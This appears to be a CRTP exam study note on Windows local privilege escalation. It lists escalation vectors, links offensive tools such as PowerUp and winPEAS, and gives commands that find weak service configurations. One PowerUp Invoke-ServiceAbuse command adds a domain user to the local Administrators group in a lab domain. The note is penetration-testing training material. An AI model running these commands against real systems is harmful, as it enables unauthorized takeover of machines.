# Local Privilege Escalation

{% hint style="info" %}
The CRTP exam consists of 5 target servers in addition to a foothold student machine.\
The goal is to OS level command execution on all 5 targets not matter what the privileges of the user.
{% endhint %}

## Vectors

#### There are various ways of locally escalating privileges on Windows box:

*  **Missing patches** – Automated deployment and AutoLogon passwords in clear text
* **AlwaysInstallElevated** (Any user can run MSI as SYSTEM)
* **Misconfigured Services** – DLL Hijacking and more
* **NTLM Relaying** a.k.a. Won't Fix

This guide offer a sufficiently comprehensive overview of the course material for local privilege escalation

{% embed url="https://github.com/0xStarlight/CRTP-Notes/blob/main/2-Local-Priv-Esc/1-Local-PrivEsc.md" %}

## Tools

### PowerUp

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}

### WinPEAS

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" %}

### Privesc

{% embed url="https://github.com/enjoiz/Privesc" %}

### Automated checks

```powershell
# PowerUp
Invoke-AllChecks

# winPEAS
winPEASx64.exe 

# Privesc
Invoke-PrivEsc
```

## Services

{% tabs %}
{% tab title="PowerUp" %}
Find vulnerable service configuration

```powershell
# Get services with unquoted paths and spaces
Get-UnquotedService -Verbose

# Get services where current user can write to binary path
Get-ModifiableServiceFile -Verbose

# Get the services whose configuration current user can modify
Get-ModifiableService -Verbose
```

Add domain user to the local Administrators group

```powershell
# Get help commands
help Invoke-ServiceAbuse -Examples
# Practical use
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
# Verify if the above command worked or not with
net localgroup administrators
# Logoff and login again to affect changes
```
{% endtab %}

{% tab title="PowerShell" %}
Get all the service path names from where the service is executing.

```powershell
Get-WmiObject -Class win32_service | select pathname
```

Get ACLs of running service

```powershell
sc.exe sdshow <servicename>
```
{% endtab %}
{% endtabs %}
